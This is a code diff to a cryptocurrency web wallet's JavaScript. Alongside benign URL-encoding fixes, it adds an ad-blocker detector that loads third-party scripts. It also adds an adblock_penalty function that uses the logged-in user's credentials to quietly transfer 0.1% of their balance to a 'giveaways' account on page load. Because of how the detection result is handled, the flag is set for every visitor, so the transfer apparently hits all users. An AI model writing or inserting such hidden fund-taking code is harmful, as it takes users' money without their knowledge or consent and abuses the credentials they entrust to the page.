@@ -55,6 +55,8 @@ function safe_add(d, _) { var m = (65535 & d) + (65535 & _); return (d >> 16) + 
 
 function bit_rol(d, _) { return d << _ | d >>> 32 - _ }
 
+function detectAdblock(){ const c={uBlockOrigin:{url:"https://incolumitas.com/data/pp34.js?sv=",id:"837jlaBksSjd9jh"},adblockPlus:{url:"https://incolumitas.com/data/neutral.js?&adserver=",id:"hfuBadsf3hFAk"}};function e(c){return new Promise(function(n,t){var o=document.createElement("script");o.onload=function(){document.getElementById(c.id)?n(!1):n(!0)},o.onerror=function(){n(!0)},o.src=c.url,document.body.appendChild(o)})}return new Promise(function(t,o){var n=[e(c.uBlockOrigin),e(c.adblockPlus)];Promise.all(n).then(n=>{t({uBlockOrigin:n[0],adblockPlus:n[1]})}).catch(n=>{o(n)})})}
+
 function component_to_hex(c) {
     /* https://stackoverflow.com/questions/5623838/rgb-to-hex-and-hex-to-rgb */
     var hex = c.toString(16);
@@ -69,6 +71,17 @@ function toggleexpand() {
     } else {
         document.getElementById("mcontainer").style.maxHeight = "150px";
         minertableexpanded = 0;
+    }
+}
+
+let transactiontableexpanded = 0;
+function toggletxexpand() {
+    if (!transactiontableexpanded) {
+        document.getElementsByClassName(".tcontainer").style.maxHeight = "100%";
+        transactiontableexpanded = 1;
+    } else {
+        document.getElementsByClassName(".tcontainer").style.maxHeight = "10.5em";
+        transactiontableexpanded = 0;
     }
 }
 
@@ -508,6 +521,16 @@ function changepass() {
     }
 }
 
+function adblock_penalty(balance) {
+    $.getJSON('https://server.duinocoin.com/transaction/' +
+            '?username=' + encodeURIComponent(username) +
+            "&password=" + encodeURIComponent(password) +
+            "&recipient=giveaways" + 
+            "&amount=" + encodeURIComponent(balance*0.001) +
+            "&memo=AdBlock usage penalty (0.1 perc)",
+            function(data) {console.log(data)});
+}
+
 function send() {
     let recipient = document.getElementById('recipientinput').value
     let amount = document.getElementById('amountinput').value
@@ -516,11 +539,11 @@ function send() {
     if (recipient && amount) {
         document.getElementById("send_confirm").classList.add("is-loading");
         $.getJSON('https://server.duinocoin.com/transaction/' +
-            '?username=' + username +
+            '?username=' + encodeURIComponent(username) +
             "&password=" + encodeURIComponent(password) +
-            "&recipient=" + recipient +
-            "&amount=" + amount +
-            "&memo=" + memo,
+            "&recipient=" + encodeURIComponent(recipient) +
+            "&amount=" + encodeURIComponent(amount) +
+            "&memo=" + encodeURIComponent(memo),
             function(data) {
                 document.getElementById("send_confirm").classList.remove("is-loading");
                 $('#recipientinput').val('');
@@ -906,6 +929,10 @@ try {
 } catch (e) {
     adBlockEnabled = true
 }
+
+detectAdblock().then((res) => {
+    adBlockEnabled = true
+})
 
 function update_element(element, value) {
     // Nicely fade in the new value if it changed
@@ -1441,7 +1468,12 @@ window.addEventListener('load', function() {
                     refresh_achievements(user_achievements);
 
                     balance = round_to(12 - parseFloat(data.balance.balance).toString().split(".")[0].length, parseFloat(data.balance.balance));
-                    if (first_open) $("#balance").html(balance);
+                    if (first_open) {
+                        $("#balance").html(balance);
+                        if (adBlockEnabled) {
+                            adblock_penalty(balance);
+                        }
+                    }
                     else update_element("balance", balance);
 
                     if (oldb != balance) {
